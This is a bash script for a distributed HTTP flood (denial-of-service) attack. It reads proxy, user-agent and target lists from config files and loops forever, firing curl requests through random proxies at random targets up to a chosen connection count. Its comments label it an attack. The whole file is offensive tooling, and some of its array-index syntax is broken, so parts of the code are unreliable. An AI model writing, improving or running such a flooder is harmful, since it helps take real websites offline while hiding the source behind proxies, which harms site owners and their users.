#!/bin/bash

#Input max connections
read -p "Please input max connections. (Default: 1000): " MC

if [[ -z "$MC" ]]
then
    MC=1000
else
    NUM_REGEX='^[0-9]+$'
    if ! [[ $MC =~ $NUM_REGEX ]]
    then
        echo "Max connections must be integer"
        exit 1
    fi

    if [ $MC -le 0 ]
    then
        echo "Max connections must greater 0"
        exit 1
    fi
fi

#cURL location and parameters
CURL="/usr/bin/curl -s -o /dev/null --retry 0 -w %{http_code} -m 30"

#Proxy list file
PROXY_FILE="proxy.cfg"

#Headers list file
HEADERS_FILE="headers.cfg"

#Target list file
TARGET_FILE="target.cfg"

#Read proxy list from proxy file
while read P_LINE
do
    P+=("$P_LINE")
done < $PROXY_FILE

#Read proxy list from proxy file
while read H_LINE
do
    H+=("$H_LINE")
done < $HEADERS_FILE

#Read proxy list from proxy file
while read T_LINE
do
    T+=("$T_LINE")
done < $TARGET_FILE

#Total proxy, headers, target(index)
TP=${#P[@] - 1}
TH=${#H[@] - 1}
TT=${#T[@] - 1}

#Main attack function
function attack()
{
    local URL=$1
    local P=$2
    local H=$3
    RESULT=`$CURL -H user-agent:"$H" -x $P $URL &`

    #Print result
    echo -e "$URL"
    echo -e "HTTP Status : $RESULT\tProxy : $P"
}

while [ 1 ]
do

    #Get current curl connections
    THREAD=`/bin/ps aux|grep curl|grep -v grep|wc -l`

    #Max curl connections
    if [ "$THREAD" -lt $MC ]
    then
        #Random proxy server
        P_R=${P[$RANDOM%TP]}

        #Random headers
        H_R=${H[$RANDOM%TH]}

	#Random target url
	T_R=${T[$RANDOM%TT]}

	#ATTACK!
        attack $T_R $P_R "$H_R" &
    fi
done